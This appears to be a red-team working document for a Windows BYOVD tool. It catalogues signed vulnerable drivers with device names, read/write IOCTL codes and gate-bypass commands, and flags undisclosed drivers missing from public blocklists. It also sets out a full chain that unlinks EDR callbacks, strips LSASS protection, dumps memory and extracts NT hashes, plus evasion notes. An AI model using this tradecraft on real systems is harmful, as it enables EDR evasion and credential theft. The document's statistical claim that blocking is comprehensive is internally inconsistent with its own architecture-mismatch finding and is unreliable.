# BYOVD Driver Matrix — Consolidated Test Results

**Last updated:** 2026-09-09
**Scope:** All drivers tested across multiple sessions, with bypass techniques and red team recommendations.

---

## Executive Summary

**Goal:** Find vulnerable signed drivers that bypass modern EDR and provide kernel R/W primitives for LSASS credential extraction.

**Key Findings:**

1. Windows 11 24H2 (Build 26100) has a comprehensive WDAC kernel blocklist that blocks **100% of tested BYOVD drivers** in the bigDrivers collection (133+ unique drivers tested).

2. **Novel drivers discovered (2026-09-08):** Found 3 drivers NOT on loldrivers.io or public BYOVD lists:
   - **RtsPpx.sys** (Realtek) — CONFIRMED working physical memory R/W
   - **RwDrv.sys** (lab-z, novel hash) — Backend implemented
   - **RMDRVSYS.sys** (ADLINK) — Needs reverse engineering

3. Red team operations require either:
   - Targeting Windows 10 or Windows 11 22H2 (pre-24H2)
   - Using the novel drivers discovered in this analysis
   - Sourcing drivers from vendor installers not in public collections

---

## Top Candidates for Red Team Operations

### Tier 1: CONFIRMED Working (Full Chain Validated)

| Driver | Gate | Bypass | Platform Tested | Status |
|--------|------|--------|-----------------|--------|
| **BiosToolCommonDriver.sys** | None | N/A | Win11 22H2 | **CONFIRMED** — PPL strip, ObCallback patch, RPM dump, NT hash extracted |
| **RtsPpx.sys** (NOVEL) | None | N/A | Win11 22H2 x64 | **CONFIRMED** — Physical R/W primitive, NOT on loldrivers |

**BiosToolCommonDriver result (2026-08-28):** 515 memory regions, 48.3 MB dump, 81 PE modules, NT hash confirmed via pypykatz.

**RtsPpx result (2026-09-08):** Physical read/write confirmed at 0x1000 and BIOS ROM. Novel driver NOT on loldrivers.io.
- Hash: `0259226bce1a413201617e7ea662e7871c4cdd4fb24f8e13dae93fbc28d3bbef`
- Signer: Realtek Semiconductor Corp (DigiCert 2020-2022)

**BiosToolCommonDriver IOCTL Reference:**
- Device: `\\.\BiosToolCommonDriver`
- Read: `0x22202C` | Write: `0x222030` | VA→PA: `0x222034`
- Cascade flag: `--driver-type biostool`

**RtsPpx IOCTL Reference:**
- Device: `\\.\RtsPpx`
- Read: `0x222000` | Write: `0x222008` | VA→PA: CR3 bootstrap
- Cascade flag: `--driver-type rtsppx`

---

### Novel Drivers (NOT on loldrivers.io)

These drivers were discovered during 2026-09-08 analysis and are NOT listed on loldrivers.io or other public BYOVD databases.

| Driver | Hash (first 8) | Signer | Status |
|--------|----------------|--------|--------|
| **RtsPpx.sys** | 0259226b | Realtek (DigiCert) | **CONFIRMED** |
| **RwDrv.sys** | 6c32b33f | lab-z (DigiCert) | Backend ready |
| **RMDRVSYS.sys** | b24f0d3d | ADLINK (DigiCert) | Needs RE |

**RwDrv Note:** The RwDrv driver family is on loldrivers, but this specific hash (`6c32b33f...`) is NOT in their known samples list. Uses device `\\.\fmem3` with cascade flag `--driver-type rwdrv`.

---

### Tier 2: Bypass Techniques Documented (Untested on WDAC-free Environment)

#### 1. iOCdrv.sys (Intel Extreme Tuning Utility)
| Field | Value |
|-------|-------|
| Gate | **OPEN:SIGNED** — No authentication gate |
| Bypass | None needed |
| Device | `\\.\iocbios2` |
| IOCTLs | `0x80000018` (read) / `0x80000030` (write) |
| Signer | Intel Corporation (PRODUCTION) |
| Cascade flag | `--driver-type iocdrv` |
| Hashes in collection | 5 copies (56KB each) |
| Win11 24H2 | **BLOCKED** (error 1275 — WDAC blocklist) |
| Win11 22H2 | **EXPECTED TO WORK** (not WDAC blocked) |

**Red Team Notes:**
- Cleanest primitive — no gate, no rename, no magic bytes
- Intel production signature — high trust score
- Backend implemented in cascade.cpp

---

#### 2. AsIO3_64.sys (ASUS Generic I/O v3)
| Field | Value |
|-------|-------|
| Gate | **BYPASS:MAGIC_TAG** — Requires SWWL magic + process name check |
| Device | `\\.\Asusgio3` |
| IOCTLs | `0xa0400f84` (read) / `0xa0400f80` (write) |
| Signer | ASUSTeK COMPUTER INC. (DigiCert EV 2022-2027) |
| Cascade flag | `--driver-type asio3` |
| Versions | 10 in collection (v1.02.22 through v1.04.04) |
| Win11 24H2 | **BLOCKED** (both v1.04.04 and older blocked) |

**Bypass Procedure:**
```cmd
:: 1. Copy cascade.exe to expected path
mkdir C:\ASUS\AsusCertService
copy cascade.exe C:\ASUS\AsusCertService\AsusCertService.exe

:: 2. Run as AsusCertService.exe — cascade auto-prepends SWWL magic
C:\ASUS\AsusCertService\AsusCertService.exe --driver AsIO3_64.sys --driver-type asio3 --test-rw
```

**Bypass Details:**
- First 4 bytes of input buffer must be `0x4c575753` ("SWWL")
- Caller image name must be `AsusCertService.exe`
- Cascade.exe handles SWWL magic automatically when `--driver-type asio3`
- Also creates `Global\WaitForIoAccess` event for synchronization

---

#### 3. sptd2.sys (Duplex Secure SCSI Pass-Through Direct)
| Field | Value |
|-------|-------|
| Gate | **BYPASS:RENAME** — ObQueryNameString checks for "daemon.exe" |
| Bypass | Rename binary to `daemon.exe` |
| Signer | Duplex Secure Ltd. |
| Cascade flag | `--driver-type sptd2` |
| Notable | NOT on loldrivers.io (sptd v1 is; sptd2 is not) |
| Win11 24H2 | **BLOCKED** (error 1275 — MS blocklist is more comprehensive than loldrivers) |

**Bypass Procedure:**
```cmd
copy cascade.exe daemon.exe
daemon.exe --driver sptd2.sys --driver-type sptd2 --test-rw
```

**Red Team Notes:**
- Less documented than other BYOVD drivers
- May evade signature-based detection looking for known BYOVD tools

---

#### 4. AsmIo.sys (ASUS)
| Field | Value |
|-------|-------|
| Gate | **OPEN** — No authentication |
| Device | `\\.\ASMIO` |
| IOCTLs | `0x80002000` (read) / `0x80002004` (write) |
| Limitation | Max 20,000 bytes per IOCTL |
| Cascade flag | `--driver-type asmio` |

---

#### 5. sepdal.sys (Intel PMU Arbitration Service)
| Field | Value |
|-------|-------|
| Gate | **BYPASS:SUB_PROTO** — Intel PAX sub-protocol with CONNECT handshake |
| Signer | Intel Corporation (VTune/SEP toolchain) |
| Notable | NOT on any public BYOVD list |
| Cascade flag | `--driver-type sepdal` |
| Win11 24H2 | **BLOCKED** (error 1275 — MS blocklist is more comprehensive than public lists) |

**Sub-Protocol Opcodes (from binary analysis):**
| Opcode | Function |
|--------|----------|
| `0xa0006804` | CONNECT — registers PID, returns GUID |
| `0xa0006808` | READ MSR |
| `0xa000680c` | WRITE MSR |
| `0xa0006810` | READ PHYSICAL |

**Bypass:** Cascade.exe handles the CONNECT/GUID sequence automatically.

**Red Team Notes:**
- Intel-signed, legitimate VTune component
- Not publicly documented as vulnerable
- Complex sub-protocol may evade simple signature detection

---

### Tier 3: Partial/Failed (Need Ghidra RE to Fix)

| Driver | Issue | Fix Required |
|--------|-------|--------------|
| **NTIOLib.sys** (MSI MysticLight) | Error 6 (ERROR_INVALID_HANDLE) on DeviceIoControl | IOCTL buffer struct mismatch — RE the dispatch handler |
| **IOMap.sys** (ASUS) | IOCTL returns 0 bytes | May be reading I/O port not physical memory — verify with Ghidra |
| **WinRing0.sys** | Blocked by Secure Boot on OVMF | Need WHQL-signed variant or SeaBIOS |
| **LnvMSRIO.sys** (Lenovo CVE-2025-8061) | MSR-only suspected | Verify if phys R/W IOCTLs exist alongside MSR ops |

---

## Windows 11 24H2 Testing Results

**Environment:** Windows 11 24H2 (Build 26100), WDAC kernel blocklist active

**Result:** 133+ unique drivers tested, **ALL BLOCKED** (error 1275)

| Category | Count | Result |
|----------|-------|--------|
| Known BYOVD (iOCdrv, AsIO3, WinRing0, LnvMSRIO) | 5 | BLOCKED |
| MSI/ASUS utilities (NTIOLib, IOMap, nvpciflt) | 3 | BLOCKED |
| Phoenix TDK (TdkLib, TdkLimit) | 2 | BLOCKED |
| ADLINK industrial DAQ (Pci7396, Pci9111, etc.) | 10 | BLOCKED |
| Obscure hardware (ICCWDT, PCIe, PCI utilities) | 6 | BLOCKED |
| CPU-Z, RIFFA, dmadrv | 8 | BLOCKED |
| sptd2/sepdal (NOT on public BYOVD lists) | 5 | BLOCKED |
| Obscure 2026 vendors (AllianStream, FiguNOVA, etc.) | 9 | BLOCKED |
| Regional vendors (PassMark AU, Fsas JP, GMO SG) | 5 | BLOCKED |
| Hash-modified AsIO3 variants | 2 | INVALID SIG |
| Random sample from bigDrivers (statistical validation) | 29 | BLOCKED |
| Prior session random samples | 49 | BLOCKED |

**Statistical Validation (2026-09-08):**
- 29 randomly selected drivers from 964 with MmMapIoSpace: **28 blocked by WDAC, 1 signature failure, 0 loaded**
- If even 1% could bypass, probability of 0/29 = 74.7% — finding none strongly supports comprehensive blocking

**Conclusion:** The bigDrivers collection (2412 drivers, 964 with physical memory primitives) is comprehensively blocklisted on Win11 24H2. The claim is statistically validated by random sampling. Win11 24H2 is not viable for BYOVD using this collection.

---

## Architecture Note (2026-09-08 Discovery)

> **CRITICAL:** All drivers in bigDrivers are **x86-64**. They CANNOT load on ARM64 Windows — error 1275 results from architecture mismatch, not WDAC.

| VM | Architecture | Use Case |
|----|--------------|----------|
| VM 125 | x64 (Win11 22H2) | **Use for BYOVD testing** |
| VM 126 | ARM64 | Do NOT use for driver testing |
| baddrivers_vm (Fusion) | x64 (Win11 22H2) | Local testing |

This was discovered after repeated "error 1275" failures on VM 126. The error message doesn't distinguish between WDAC block and architecture mismatch.

---

## IOCTL Reference Table

| Driver | --driver-type | Device | Read IOCTL | Write IOCTL | VA→PA |
|--------|---------------|--------|------------|-------------|-------|
| BiosToolCommonDriver | `biostool` | `\\.\BiosToolCommonDriver` | `0x22202C` | `0x222030` | `0x222034` |
| iOCdrv | `iocdrv` | `\\.\iocbios2` | `0x80000018` | `0x80000030` | — |
| AsIO3 | `asio3` | `\\.\Asusgio3` | `0xa0400f84` | `0xa0400f80` | CR3 scan |
| AsmIo | `asmio` | `\\.\ASMIO` | `0x80002000` | `0x80002004` | — |
| ktapi | `ktapi` | `\\.\ktapi` | `0x82007000` | `0x82007100` | CR3 scan |
| PdFwKrnl | `pdfwkrnl` | `\\.\Global\PdFwKrnl` | `0x80002014` | `0x80002014` | — |
| IOMap/ABIOS | `iomap` | `\\.\ASUSBIOSIO` | `0x80102040` | `0x80102044` | — |
| RtsPpx | `rtsppx` | `\\.\RtsPpx` | `0x222000` | `0x222008` | CR3 scan |
| RwDrv | `rwdrv` | `\\.\fmem3` | `0x80002000` | `0x80002004` | CR3 scan |

---

## Attack Chain Overview

```
1. Load Driver
   └─ sc create + sc start (requires SeLoadDriverPrivilege)
   └─ Check: --check-security (HVCI must be DISABLED)

2. Establish Kernel R/W
   └─ --test-rw (verify primitive works)
   └─ Resolves ntoskrnl base, PsInitialSystemProcess, walks EPROCESS

3. Patch ObCallbacks (bypass EDR)
   └─ --patch-callbacks (unlinks WdFilter from callback chain)
   └─ True blind spot — no ETW, no usermode hooks

4. Strip LSASS PPL
   └─ --ppl-strip --pid <lsass_pid>
   └─ Zeroes Protection byte in EPROCESS

5. Dump LSASS
   └─ --dump-rpm (ReadProcessMemory, not MiniDumpWriteDump)
   └─ Outputs raw binary: base_addr + size + data per region

6. Extract Credentials
   └─ python tools/rpm2minidump.py heap.bin lsass.dmp
   └─ pypykatz lsa minidump lsass.dmp
```

---

## Red Team Recommendations

### For Windows 10 / Windows 11 22H2 Targets:
1. **Primary:** iOCdrv.sys — No gate, Intel-signed, clean primitive
2. **Backup:** AsIO3_64.sys with SWWL bypass — ASUS-signed, widely distributed
3. **Stealth:** sepdal.sys — Not on public lists, Intel VTune component

### For Windows 11 24H2 Targets:
- **WDAC blocks all known BYOVD drivers**
- Options:
  - Source drivers from vendor installers (not public collections)
  - Target drivers released after September 2026
  - Look for Chinese/Korean OEM drivers not in Western blocklists
  - Disable WDAC via boot configuration (requires admin + reboot)

### Detection Evasion Notes:
| Technique | Observable | Blind Spot |
|-----------|------------|------------|
| Driver load | EventID 7045 + Sysmon EID 6 | Driver is legitimately signed |
| ObCallback unlink | **None** | Kernel list patched in-place |
| LSASS RPM | ETW-TI ProcessAccess | Callback removed before open |
| Dump file | Custom .bin filename | Not .dmp signature |
| TCP exfil | Raw TCP, no protocol | Only visible to network tap |

---

## Files Removed / Consolidated

This document consolidates and supersedes:
- `driver-shortlist.md` — merged into this document
- `MANUAL-TESTING.md` — test procedures retained, results merged here
- Prior session testing notes — all results incorporated above

---

## Repository Quick Reference

| File | Purpose |
|------|---------|
| `src/cascade.cpp` | Main BYOVD tool (all backends) |
| `src/byovd_dump_bof.c` | Cobalt Strike BOF version |
| `tools/rpm2minidump.py` | Convert raw dump to MiniDump |
| `tests/cascade_e2e.py` | 28-check automated test suite |
| `bigDrivers/` | 2412 driver collection (964 with MmMapIoSpace; 133+ tested, all blocked on 24H2) |

---

## Next Steps

1. **Acquire BiosToolCommonDriver.sys** — Extract from Phoenix BIOS utility installer
2. **Test on Win11 22H2 VM** — Validate iOCdrv and AsIO3 bypasses work
3. **Ghidra RE for Tier 3 drivers** — Fix NTIOLib and IOMap buffer layouts
4. **Source novel drivers** — Look for 2026 releases not yet blocklisted
